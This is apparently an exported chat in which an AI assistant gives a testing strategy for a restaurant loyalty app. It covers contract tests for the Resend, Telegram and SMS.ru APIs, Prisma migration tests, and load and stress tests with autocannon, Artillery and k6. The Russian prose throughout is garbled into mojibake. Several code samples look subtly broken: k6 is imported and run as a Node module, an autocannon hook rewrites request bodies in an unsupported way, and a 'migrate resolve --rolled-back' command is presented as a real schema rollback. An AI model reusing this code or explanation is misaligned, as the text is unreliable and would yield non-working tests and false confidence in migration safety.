- C) B + automated tests –≤ CI/CD (daily)
- D) C + fallback provider (SendGrid) –µ—Å–ª–∏ Resend unavailable

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- External APIs –º–µ–Ω—è—é—Ç—Å—è –±–µ–∑ notice
- Daily contract tests –ª–æ–≤—è—Ç –∏–∑–º–µ–Ω–µ–Ω–∏—è —Ä–∞–Ω–æ
- Fallback provider = production resilience

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/contract/external-apis.contract.spec.ts
describe('External API Contract Tests', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Resend Email API contract
  describe('Resend Email API', () => {
    it('should match Resend API response schema', async () => {
      const resendService = app.get('ResendService');

      // Make actual API call (not mock!)
      const response = await resendService.send({
        to: 'test@example.com',
        from: 'noreply@max-loyalty.com',
        subject: 'Contract Test',
        html: '<p>Test email</p>',
      });

      // Expected schema
      expect(response).toMatchObject({
        id: expect.stringMatching(/^[a-f0-9-]+$/), // UUID format
        from: 'noreply@max-loyalty.com',
        to: ['test@example.com'],
        created_at: expect.any(String), // ISO date
      });

      // Save snapshot for comparison
      const fs = require('fs');
      const snapshotPath = './test/snapshots/resend-response.json';
      
      if (fs.existsSync(snapshotPath)) {
        const previousSnapshot = JSON.parse(fs.readFileSync(snapshotPath, 'utf8'));
        
        // Compare schemas (not values)
        const currentSchema = getObjectSchema(response);
        const previousSchema = getObjectSchema(previousSnapshot);

        expect(currentSchema).toEqual(previousSchema);
      } else {
        // First run: save snapshot
        fs.writeFileSync(snapshotPath, JSON.stringify(response, null, 2));
      }
    });

    it('should handle Resend API error format', async () => {
      const resendService = app.get('ResendService');

      try {
        await resendService.send({
          to: 'invalid-email', // Invalid
          from: 'noreply@max-loyalty.com',
          subject: 'Test',
          html: '<p>Test</p>',
        });
      } catch (error) {
        // Expected error schema
        expect(error.response).toMatchObject({
          statusCode: expect.any(Number),
          message: expect.any(String),
          name: expect.stringMatching(/^[A-Z_]+$/),
        });
      }
    });
  });

  // Telegram Bot API contract
  describe('Telegram Bot API', () => {
    it('should match Telegram sendMessage response', async () => {
      const telegramService = app.get('TelegramService');

      const response = await telegramService.sendMessage({
        chat_id: process.env.TEST_TELEGRAM_CHAT_ID,
        text: 'Contract test',
      });

      expect(response).toMatchObject({
        ok: true,
        result: {
          message_id: expect.any(Number),
          date: expect.any(Number),
          chat: {
            id: expect.any(Number),
            type: expect.any(String),
          },
          text: 'Contract test',
        },
      });
    });

    it('should handle Telegram API rate limit error', async () => {
      const telegramService = app.get('TelegramService');

      // Send 30 messages rapidly (trigger rate limit)
      const promises = Array(30).fill(null).map(() =>
        telegramService.sendMessage({
          chat_id: process.env.TEST_TELEGRAM_CHAT_ID,
          text: 'Rate limit test',
        })
      );

      try {
        await Promise.all(promises);
      } catch (error) {
        expect(error.response).toMatchObject({
          ok: false,
          error_code: 429,
          description: expect.stringContaining('Too Many Requests'),
          parameters: {
            retry_after: expect.any(Number),
          },
        });
      }
    });
  });

  // SMS.ru API contract
  describe('SMS.ru API', () => {
    it('should match SMS.ru response format', async () => {
      const smsService = app.get('SmsService');

      const response = await smsService.send({
        phone: '+79991234567',
        message: 'Contract test',
      });

      expect(response).toMatchObject({
        status: expect.stringMatching(/^(OK|ERROR)$/),
        status_code: expect.any(Number),
        sms: {
          ['+79991234567']: {
            status: expect.stringMatching(/^(OK|ERROR)$/),
            status_code: expect.any(Number),
            sms_id: expect.any(String),
          },
        },
        balance: expect.any(Number),
      });
    });
  });

  // Fallback provider test
  describe('Fallback Provider', () => {
    it('should fallback to SendGrid if Resend fails', async () => {
      const emailService = app.get('EmailService');

      // Mock Resend failure
      const resendService = app.get('ResendService');
      jest.spyOn(resendService, 'send').mockRejectedValue(new Error('503 Service Unavailable'));

      // Mock SendGrid success
      const sendGridService = app.get('SendGridService');
      jest.spyOn(sendGridService, 'send').mockResolvedValue({ success: true });

      const result = await emailService.send({
        to: 'test@example.com',
        subject: 'Test',
        html: '<p>Test</p>',
      });

      expect(result.provider).toBe('sendgrid');
      expect(sendGridService.send).toHaveBeenCalled();
    });
  });
});

// Helper function
function getObjectSchema(obj: any): any {
  if (Array.isArray(obj)) {
    return obj.length > 0 ? [getObjectSchema(obj[0])] : [];
  }
  
  if (typeof obj === 'object' && obj !== null) {
    const schema: any = {};
    for (const key in obj) {
      schema[key] = getObjectSchema(obj[key]);
    }
    return schema;
  }
  
  return typeof obj;
}
```

**CI/CD configuration (GitHub Actions):**

```yaml
# .github/workflows/contract-tests.yml
name: Contract Tests

on:
  schedule:
    - cron: '0 9 * * *' # Daily at 9:00 UTC
  workflow_dispatch: # Manual trigger

jobs:
  contract-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run contract tests
        env:
          RESEND_API_KEY: ${{ secrets.RESEND_API_KEY }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          SMS_RU_API_KEY: ${{ secrets.SMS_RU_API_KEY }}
        run: npm run test:contract
      
      - name: Compare schemas with snapshots
        run: node scripts/compare-api-schemas.js
      
      - name: Send alert on contract violation
        if: failure()
        uses: slackapi/slack-github-action@v1
        with:
          webhook-url: ${{ secrets.SLACK_WEBHOOK_URL }}
          payload: |
            {
              "text": "üö® External API contract violation detected!",
              "blocks": [
                {
                  "type": "section",
                  "text": {
                    "type": "mrkdwn",
                    "text": "*Contract Test Failed*\nExternal API schema has changed. Review logs for details."
                  }
                }
              ]
            }
```


***

### **20. Database Schema Changes - migration tests?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Prisma migration –¥–æ–±–∞–≤–ª—è–µ—Ç –Ω–æ–≤–æ–µ –ø–æ–ª–µ.

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å?

- A) –ü—Ä–∏–º–µ–Ω–∏—Ç—å migration –≤ dev ‚Üí manual test
- B) Automated test: apply migration ‚Üí rollback ‚Üí re-apply
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ –¥–∞–Ω–Ω—ã–µ –Ω–µ –ø–æ—Ç–µ—Ä—è–ª–∏—Å—å
- D) C + —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –Ω–∞ production-like dataset (1M rows)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Migration rollback –∫—Ä–∏—Ç–∏—á–µ–Ω –¥–ª—è production safety
- Data loss = catastrophic failure
- Large dataset testing –Ω–∞—Ö–æ–¥–∏—Ç performance issues

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/contract/database-migrations.spec.ts
describe('Database Migration Contract Tests', () => {
  let prisma: PrismaClient;

  beforeAll(async () => {
    prisma = new PrismaClient({
      datasources: { db: { url: process.env.TEST_DATABASE_URL } },
    });
  });

  afterAll(async () => {
    await prisma.$disconnect();
  });

  describe('Migration: Add loyaltyLevel field to GuestCard', () => {
    it('should apply migration successfully', async () => {
      // Run migration
      const { execSync } = require('child_process');
      execSync('npx prisma migrate deploy', {
        env: { ...process.env, DATABASE_URL: process.env.TEST_DATABASE_URL },
      });

      // Verify schema updated
      const tableInfo = await prisma.$queryRaw`
        SELECT column_name, data_type, is_nullable
        FROM information_schema.columns
        WHERE table_name = 'GuestCard' AND column_name = 'loyaltyLevelId';
      `;

      expect(tableInfo).toHaveLength(1);
      expect(tableInfo[0]).toMatchObject({
        column_name: 'loyaltyLevelId',
        data_type: 'text',
        is_nullable: 'YES',
      });
    });

    it('should rollback migration without data loss', async () => {
      // Create test data
      const testData = await prisma.guestCard.create({
        data: {
          id: 'card-1',
          userId: 'user-1',
          tenantId: 'tenant-1',
          totalBalance: 1500,
          qrCode: 'qr-1',
          displayCode: '123456',
          status: 'ACTIVE',
        },
      });

      // Rollback migration
      const { execSync } = require('child_process');
      execSync('npx prisma migrate resolve --rolled-back 20260212_add_loyalty_level', {
        env: { ...process.env, DATABASE_URL: process.env.TEST_DATABASE_URL },
      });

      // Verify data still exists
      const card = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
      expect(card.totalBalance).toBe(1500);
    });

    it('should re-apply migration successfully', async () => {
      const { execSync } = require('child_process');
      execSync('npx prisma migrate deploy', {
        env: { ...process.env, DATABASE_URL: process.env.TEST_DATABASE_URL },
      });

      // Verify field exists again
      const card = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
      expect(card).toHaveProperty('loyaltyLevelId');
    });
  });

  // Test: Migration performance on large dataset
  describe('Migration Performance', () => {
    it('should handle migration on 1M rows', async () => {
      jest.setTimeout(300000); // 5 minutes

      // Create 1M guest cards
      console.log('Creating 1M guest cards...');
      const batchSize = 10000;
      
      for (let i = 0; i < 100; i++) {
        const data = Array(batchSize).fill(null).map((_, j) => ({
          id: `card-${i * batchSize + j}`,
          userId: `user-${i * batchSize + j}`,
          tenantId: 'tenant-1',
          totalBalance: Math.floor(Math.random() * 5000),
          qrCode: `qr-${i * batchSize + j}`,
          displayCode: String(i * batchSize + j).padStart(6, '0'),
          status: 'ACTIVE',
        }));

        await prisma.guestCard.createMany({ data });
        
        if (i % 10 === 0) {
          console.log(`Progress: ${i + 1}/100 batches`);
        }
      }

      console.log('Running migration...');
      const startTime = Date.now();

      // Run migration (add index on loyaltyLevelId)
      await prisma.$executeRaw`
        CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_guest_card_loyalty_level
        ON "GuestCard" ("loyaltyLevelId");
      `;

      const duration = Date.now() - startTime;
      console.log(`Migration completed in ${duration}ms`);

      // Should complete in < 60 seconds
      expect(duration).toBeLessThan(60000);
    });
  });

  // Test: Data integrity after migration
  describe('Data Integrity', () => {
    it('should preserve all existing data', async () => {
      // Snapshot data before migration
      const beforeSnapshot = await prisma.guestCard.findMany({
        select: { id: true, totalBalance: true, totalSpent: true },
      });

      // Run migration
      const { execSync } = require('child_process');
      execSync('npx prisma migrate deploy', {
        env: { ...process.env, DATABASE_URL: process.env.TEST_DATABASE_URL },
      });

      // Snapshot data after migration
      const afterSnapshot = await prisma.guestCard.findMany({
        select: { id: true, totalBalance: true, totalSpent: true },
      });

      // Compare snapshots
      expect(afterSnapshot).toHaveLength(beforeSnapshot.length);
      
      for (const before of beforeSnapshot) {
        const after = afterSnapshot.find(a => a.id === before.id);
        expect(after).toMatchObject(before);
      }
    });
  });
});
```


***

–ü—Ä–æ–¥–æ–ª–∂–∞—é —Å **Load \& Performance Testing (–≤–æ–ø—Ä–æ—Å—ã 21-30)**? üöÄ

---

# –ü—Ä–æ–¥–æ–ª–∂–∞–π

–ü—Ä–æ–¥–æ–ª–∂–∞—é! üöÄ

***

## **–ë–õ–û–ö 5: LOAD \& PERFORMANCE TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**


***

### **21. Webhook Throughput - —Å–∫–æ–ª—å–∫–æ webhooks/sec?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –†–µ—Å—Ç–æ—Ä–∞–Ω –≤ —á–∞—Å –ø–∏–∫ = 100 —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π/–º–∏–Ω—É—Ç—É.

**–í–æ–ø—Ä–æ—Å:** –ù—É–∂–µ–Ω –ª–∏ load test?

- A) –ù–µ—Ç, –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ production monitoring
- B) –î–∞, simulate 100 webhooks/min
- C) B + simulate 1000 webhooks/min (10x peak)
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å latency (p50, p95, p99)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- 10x peak testing –Ω–∞—Ö–æ–¥–∏—Ç bottlenecks –¥–æ production
- Latency percentiles (p95, p99) –ø–æ–∫–∞–∑—ã–≤–∞—é—Ç worst-case performance
- Production monitoring –ù–ï –ó–ê–ú–ï–ù–Ø–ï–¢ load testing

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/load/webhook-throughput.load.spec.ts
import autocannon from 'autocannon';

describe('Webhook Throughput - Load Testing', () => {
  let app: INestApplication;
  let baseUrl: string;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.listen(0); // Random port

    const address = app.getHttpServer().address();
    baseUrl = `http://localhost:${address.port}`;
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Expected Load (100 webhooks/min)
  it('should handle 100 webhooks/min (expected load)', async () => {
    jest.setTimeout(120000); // 2 minutes

    const result = await autocannon({
      url: `${baseUrl}/webhooks/transaction`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Webhook-Signature': generateSignature(),
      },
      body: JSON.stringify({
        posSystem: 'IIKO_CLOUD',
        posCheckId: generateCheckId(),
        tenantId: 'tenant-1',
        checkAmount: 2850,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      }),
      connections: 10, // Concurrent connections
      duration: 60, // 60 seconds
      amount: 100, // 100 requests total
      setupClient: (client) => {
        // Each request has unique posCheckId
        client.on('request', (req) => {
          req.body = JSON.stringify({
            ...JSON.parse(req.body),
            posCheckId: generateCheckId(),
          });
        });
      },
    });

    console.log('=== Expected Load (100 req/min) ===');
    console.log(`Requests: ${result.requests.total}`);
    console.log(`Duration: ${result.duration}s`);
    console.log(`Throughput: ${result.requests.average} req/sec`);
    console.log(`Latency p50: ${result.latency.p50}ms`);
    console.log(`Latency p95: ${result.latency.p95}ms`);
    console.log(`Latency p99: ${result.latency.p99}ms`);
    console.log(`Errors: ${result.errors}`);

    // Assertions
    expect(result.requests.total).toBe(100);
    expect(result.errors).toBe(0);
    expect(result.latency.p95).toBeLessThan(500); // p95 < 500ms
    expect(result.latency.p99).toBeLessThan(1000); // p99 < 1s
  });

  // Test 2: Peak Load (1000 webhooks/min = 10x)
  it('should handle 1000 webhooks/min (10x peak)', async () => {
    jest.setTimeout(180000); // 3 minutes

    const result = await autocannon({
      url: `${baseUrl}/webhooks/transaction`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Webhook-Signature': generateSignature(),
      },
      body: JSON.stringify({
        posSystem: 'IIKO_CLOUD',
        posCheckId: generateCheckId(),
        tenantId: 'tenant-1',
        checkAmount: 2850,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      }),
      connections: 50,
      duration: 60,
      amount: 1000,
      setupClient: (client) => {
        client.on('request', (req) => {
          req.body = JSON.stringify({
            ...JSON.parse(req.body),
            posCheckId: generateCheckId(),
          });
        });
      },
    });

    console.log('=== Peak Load (1000 req/min = 10x) ===');
    console.log(`Requests: ${result.requests.total}`);
    console.log(`Throughput: ${result.requests.average} req/sec`);
    console.log(`Latency p50: ${result.latency.p50}ms`);
    console.log(`Latency p95: ${result.latency.p95}ms`);
    console.log(`Latency p99: ${result.latency.p99}ms`);
    console.log(`Errors: ${result.errors}`);

    // More lenient for peak load
    expect(result.errors).toBeLessThan(10); // < 1% error rate
    expect(result.latency.p95).toBeLessThan(2000); // p95 < 2s
    expect(result.latency.p99).toBeLessThan(5000); // p99 < 5s
  });

  // Test 3: Stress Test (until failure)
  it('should find breaking point', async () => {
    jest.setTimeout(300000); // 5 minutes

    let maxThroughput = 0;
    let breakingPoint = 0;

    // Gradually increase load until failure
    for (let connections = 10; connections <= 200; connections += 20) {
      console.log(`\nTesting with ${connections} concurrent connections...`);

      const result = await autocannon({
        url: `${baseUrl}/webhooks/transaction`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Webhook-Signature': generateSignature(),
        },
        body: JSON.stringify({
          posSystem: 'IIKO_CLOUD',
          posCheckId: generateCheckId(),
          tenantId: 'tenant-1',
          checkAmount: 2850,
          guestPhone: '+79991234567',
          timestamp: new Date().toISOString(),
        }),
        connections,
        duration: 30,
        setupClient: (client) => {
          client.on('request', (req) => {
            req.body = JSON.stringify({
              ...JSON.parse(req.body),
              posCheckId: generateCheckId(),
            });
          });
        },
      });

      const errorRate = (result.errors / result.requests.total) * 100;
      const throughput = result.requests.average;

      console.log(`Throughput: ${throughput} req/sec`);
      console.log(`Error rate: ${errorRate.toFixed(2)}%`);
      console.log(`Latency p99: ${result.latency.p99}ms`);

      if (errorRate > 5 || result.latency.p99 > 10000) {
        // Breaking point: > 5% errors or p99 > 10s
        breakingPoint = connections;
        console.log(`\nüî¥ Breaking point: ${connections} connections`);
        break;
      }

      maxThroughput = Math.max(maxThroughput, throughput);
    }

    console.log(`\n=== Stress Test Results ===`);
    console.log(`Max throughput: ${maxThroughput} req/sec`);
    console.log(`Breaking point: ${breakingPoint} concurrent connections`);

    // Should handle at least 100 concurrent connections
    expect(breakingPoint).toBeGreaterThanOrEqual(100);
  });

  // Test 4: Sustained Load (soak test)
  it('should handle sustained load for 10 minutes', async () => {
    jest.setTimeout(660000); // 11 minutes

    const result = await autocannon({
      url: `${baseUrl}/webhooks/transaction`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Webhook-Signature': generateSignature(),
      },
      body: JSON.stringify({
        posSystem: 'IIKO_CLOUD',
        posCheckId: generateCheckId(),
        tenantId: 'tenant-1',
        checkAmount: 2850,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      }),
      connections: 20,
      duration: 600, // 10 minutes
      setupClient: (client) => {
        client.on('request', (req) => {
          req.body = JSON.stringify({
            ...JSON.parse(req.body),
            posCheckId: generateCheckId(),
          });
        });
      },
    });

    console.log('=== Sustained Load (10 min) ===');
    console.log(`Total requests: ${result.requests.total}`);
    console.log(`Average throughput: ${result.requests.average} req/sec`);
    console.log(`Errors: ${result.errors}`);
    console.log(`Latency p99: ${result.latency.p99}ms`);

    // Should maintain performance over time (no memory leaks)
    expect(result.errors).toBeLessThan(result.requests.total * 0.01); // < 1% error rate
    expect(result.latency.p99).toBeLessThan(2000); // p99 stable
  });

  // Test 5: Resource Monitoring
  it('should monitor CPU and memory during load', async () => {
    const pidusage = require('pidusage');
    const stats: any[] = [];

    // Start monitoring
    const interval = setInterval(async () => {
      const usage = await pidusage(process.pid);
      stats.push({
        timestamp: Date.now(),
        cpu: usage.cpu,
        memory: usage.memory / 1024 / 1024, // MB
      });
    }, 1000);

    // Run load test
    await autocannon({
      url: `${baseUrl}/webhooks/transaction`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Webhook-Signature': generateSignature(),
      },
      body: JSON.stringify({
        posSystem: 'IIKO_CLOUD',
        posCheckId: generateCheckId(),
        tenantId: 'tenant-1',
        checkAmount: 2850,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      }),
      connections: 50,
      duration: 60,
    });

    clearInterval(interval);

    // Analyze stats
    const avgCpu = stats.reduce((sum, s) => sum + s.cpu, 0) / stats.length;
    const maxCpu = Math.max(...stats.map(s => s.cpu));
    const avgMemory = stats.reduce((sum, s) => sum + s.memory, 0) / stats.length;
    const maxMemory = Math.max(...stats.map(s => s.memory));

    console.log('=== Resource Usage ===');
    console.log(`Avg CPU: ${avgCpu.toFixed(2)}%`);
    console.log(`Max CPU: ${maxCpu.toFixed(2)}%`);
    console.log(`Avg Memory: ${avgMemory.toFixed(2)} MB`);
    console.log(`Max Memory: ${maxMemory.toFixed(2)} MB`);

    // Assertions
    expect(maxCpu).toBeLessThan(80); // CPU < 80%
    expect(maxMemory).toBeLessThan(1024); // Memory < 1GB
  });
});

// Helper functions
function generateCheckId(): string {
  return `CHK-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
}

function generateSignature(): string {
  return 'mock-signature-for-testing';
}
```

**package.json:**

```json
{
  "devDependencies": {
    "autocannon": "^7.14.0",
    "pidusage": "^3.0.2"
  },
  "scripts": {
    "test:load": "jest --testMatch='**/*.load.spec.ts' --runInBand"
  }
}
```

**Artillery alternative (YAML config):**

```yaml
# test/load/webhook-throughput.yml
config:
  target: "http://localhost:3000"
  phases:
    # Warm-up
    - duration: 60
      arrivalRate: 5
      name: "Warm-up"
    
    # Ramp-up
    - duration: 300
      arrivalRate: 5
      rampTo: 50
      name: "Ramp-up to peak"
    
    # Sustained peak
    - duration: 600
      arrivalRate: 50
      name: "Sustained peak load"
    
    # Spike
    - duration: 60
      arrivalRate: 200
      name: "Spike test"

  defaults:
    headers:
      Content-Type: "application/json"
      X-Webhook-Signature: "mock-signature"

scenarios:
  - name: "POS Webhook"
    flow:
      - post:
          url: "/webhooks/transaction"
          json:
            posSystem: "IIKO_CLOUD"
            posCheckId: "{{ $randomString() }}"
            tenantId: "tenant-1"
            checkAmount: 2850
            guestPhone: "+79991234567"
            timestamp: "{{ $timestamp() }}"
```


***

### **22. Concurrent User Load - —Å–∫–æ–ª—å–∫–æ –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Black Friday ‚Üí 1000 –≥–æ—Å—Ç–µ–π –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –æ—Ç–∫—Ä—ã–≤–∞—é—Ç Telegram Mini App.

**–í–æ–ø—Ä–æ—Å:** Load test —Å—Ü–µ–Ω–∞—Ä–∏–π?

- A) 10 concurrent users (smoke test)
- B) 100 concurrent users (expected load)
- C) 1000 concurrent users (peak load)
- D) C + 5000 users (stress test –¥–æ failure)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Black Friday = —Ä–µ–∞–ª—å–Ω—ã–π —Å—Ü–µ–Ω–∞—Ä–∏–π —Å –ø–∏–∫–æ–≤–æ–π –Ω–∞–≥—Ä—É–∑–∫–æ–π
- Stress testing –Ω–∞—Ö–æ–¥–∏—Ç limits –¥–æ production crash
- 5000 users = 5x peak testing

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/load/concurrent-users.load.spec.ts
import { Cluster } from 'k6';

describe('Concurrent User Load Testing', () => {
  // Test 1: Smoke Test (10 users)
  it('should handle 10 concurrent users', async () => {
    const result = await runK6Script({
      vus: 10, // Virtual users
      duration: '30s',
      script: userJourneyScript,
    });

    expect(result.metrics.http_req_failed.rate).toBeLessThan(0.01); // < 1% failure
    expect(result.metrics.http_req_duration.p95).toBeLessThan(500); // p95 < 500ms
  });

  // Test 2: Expected Load (100 users)
  it('should handle 100 concurrent users', async () => {
    const result = await runK6Script({
      vus: 100,
      duration: '5m',
      script: userJourneyScript,
    });

    console.log('=== 100 Concurrent Users ===');
    console.log(`Requests: ${result.metrics.http_reqs.count}`);
    console.log(`Failed: ${result.metrics.http_req_failed.count}`);
    console.log(`p95 latency: ${result.metrics.http_req_duration.p95}ms`);
    console.log(`p99 latency: ${result.metrics.http_req_duration.p99}ms`);

    expect(result.metrics.http_req_failed.rate).toBeLessThan(0.01);
    expect(result.metrics.http_req_duration.p95).toBeLessThan(1000);
  });

  // Test 3: Peak Load (1000 users)
  it('should handle 1000 concurrent users (Black Friday)', async () => {
    const result = await runK6Script({
      stages: [
        { duration: '2m', target: 100 },  // Ramp-up to 100
        { duration: '3m', target: 1000 }, // Ramp-up to 1000
        { duration: '10m', target: 1000 }, // Sustain 1000
        { duration: '2m', target: 0 },    // Ramp-down
      ],
      script: userJourneyScript,
    });

    console.log('=== 1000 Concurrent Users (Black Friday) ===');
    console.log(`Total requests: ${result.metrics.http_reqs.count}`);
    console.log(`Failed: ${result.metrics.http_req_failed.count}`);
    console.log(`Failure rate: ${(result.metrics.http_req_failed.rate * 100).toFixed(2)}%`);
    console.log(`p95 latency: ${result.metrics.http_req_duration.p95}ms`);
    console.log(`p99 latency: ${result.metrics.http_req_duration.p99}ms`);

    expect(result.metrics.http_req_failed.rate).toBeLessThan(0.05); // < 5% failures
    expect(result.metrics.http_req_duration.p99).toBeLessThan(5000); // p99 < 5s
  });

  // Test 4: Stress Test (5000 users)
  it('should stress test with 5000 users', async () => {
    const result = await runK6Script({
      stages: [
        { duration: '5m', target: 1000 },  // Ramp to 1000
        { duration: '5m', target: 2500 },  // Ramp to 2500
        { duration: '5m', target: 5000 },  // Ramp to 5000
        { duration: '5m', target: 5000 },  // Sustain 5000
        { duration: '3m', target: 0 },     // Ramp-down
      ],
      script: userJourneyScript,
    });

    console.log('=== 5000 Concurrent Users (Stress Test) ===');
    console.log(`Total requests: ${result.metrics.http_reqs.count}`);
    console.log(`Failed: ${result.metrics.http_req_failed.count}`);
    console.log(`Failure rate: ${(result.metrics.http_req_failed.rate * 100).toFixed(2)}%`);
    console.log(`p95 latency: ${result.metrics.http_req_duration.p95}ms`);
    console.log(`p99 latency: ${result.metrics.http_req_duration.p99}ms`);

    // More lenient for stress test
    expect(result.metrics.http_req_failed.rate).toBeLessThan(0.10); // < 10% failures
  });
});

// K6 User Journey Script
const userJourneyScript = `
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate } from 'k6/metrics';

const errorRate = new Rate('errors');

export default function() {
  const baseUrl = __ENV.BASE_URL || 'http://localhost:3000';
  const token = __ENV.JWT_TOKEN;

  // Step 1: Get balance
  let res = http.get(\`\${baseUrl}/api/v1/guest/balance\`, {
    headers: {
      'Authorization': \`Bearer \${token}\`,
    },
  });

  check(res, {
    'balance status is 200': (r) => r.status === 200,
    'balance has data': (r) => JSON.parse(r.body).balance !== undefined,
  }) || errorRate.add(1);

  sleep(1);

  // Step 2: Get transaction history
  res = http.get(\`\${baseUrl}/api/v1/guest/transactions?page=1&limit=10\`, {
    headers: {
      'Authorization': \`Bearer \${token}\`,
    },
  });

  check(res, {
    'transactions status is 200': (r) => r.status === 200,
    'transactions is array': (r) => Array.isArray(JSON.parse(r.body).data),
  }) || errorRate.add(1);

  sleep(2);

  // Step 3: Get QR code
  res = http.get(\`\${baseUrl}/api/v1/guest/qr-code\`, {
    headers: {
      'Authorization': \`Bearer \${token}\`,
    },
  });

  check(res, {
    'qr code status is 200': (r) => r.status === 200,
    'qr code has url': (r) => JSON.parse(r.body).qrCodeUrl !== undefined,
  }) || errorRate.add(1);

  sleep(3);

  // Step 4: Get active promos
  res = http.get(\`\${baseUrl}/api/v1/guest/promos/active\`, {
    headers: {
      'Authorization': \`Bearer \${token}\`,
    },
  });

  check(res, {
    'promos status is 200': (r) => r.status === 200,
  }) || errorRate.add(1);

  sleep(2);
}
`;

// Helper function to run K6
async function runK6Script(options: any): Promise<any> {
  const k6 = require('k6');
  const fs = require('fs');
  const path = require('path');

  // Write script to temp file
  const scriptPath = path.join(__dirname, 'temp-k6-script.js');
  fs.writeFileSync(scriptPath, userJourneyScript);

  // Run k6
  const result = await k6.run({
    script: scriptPath,
    vus: options.vus,
    duration: options.duration,
    stages: options.stages,
    thresholds: {
      http_req_failed: ['rate<0.1'], // < 10% failures
      http_req_duration: ['p(95)<2000'], // p95 < 2s
    },
  });

  // Cleanup
  fs.unlinkSync(scriptPath);

  return result;
}
```

**k6 CLI alternative:**

```javascript
// test/load/user-journey.k6.js
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate, Trend } from 'k6/metrics';

// Custom metrics
const errorRate = new Rate('errors');
const userJourneyDuration = new Trend('user_journey_duration');

export const options = {
  stages: [
    { duration: '2m', target: 100 },   // Ramp-up
    { duration: '5m', target: 1000 },  // Peak
    { duration: '10m', target: 1000 }, // Sustain
    { duration: '2m', target: 0 },     // Ramp-down
  ],
  thresholds: {
    errors: ['rate<0.05'], // < 5% error rate
    http_req_duration: ['p(95)<1000', 'p(99)<3000'],
    user_journey_duration: ['p(95)<10000'], // User journey < 10s
  },
};

export default function() {
  const baseUrl = __ENV.BASE_URL;
  const startTime = Date.now();

  // Simulate user journey
  const token = generateGuestToken();

  // 1. View balance
  let res = http.get(`${baseUrl}/api/v1/guest/balance`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  check(res, { 'balance OK': (r) => r.status === 200 }) || errorRate.add(1);
  sleep(1);

  // 2. View history
  res = http.get(`${baseUrl}/api/v1/guest/transactions`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  check(res, { 'transactions OK': (r) => r.status === 200 }) || errorRate.add(1);
  sleep(2);

  // 3. View QR code
  res = http.get(`${baseUrl}/api/v1/guest/qr-code`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  check(res, { 'QR code OK': (r) => r.status === 200 }) || errorRate.add(1);
  sleep(1);

  // Record user journey duration
  userJourneyDuration.add(Date.now() - startTime);
}

function generateGuestToken() {
  // In real test, use pre-generated tokens from database
  return __ENV.JWT_TOKEN;
}
```

**Run command:**

```bash
k6 run --out json=results.json test/load/user-journey.k6.js
```


***

–ü—Ä–æ–¥–æ–ª–∂–∞—é —Å –≤–æ–ø—Ä–æ—Å–∞–º–∏ **23-30** (–æ—Å—Ç–∞–ª—å–Ω—ã–µ Load \& Performance)? üöÄ

---

# –ü—Ä–æ–¥–æ–ª–∂–∞–π

–ü—Ä–æ–¥–æ–ª–∂–∞—é! üöÄ

***

### **23. Database Query Performance - slow queries?**

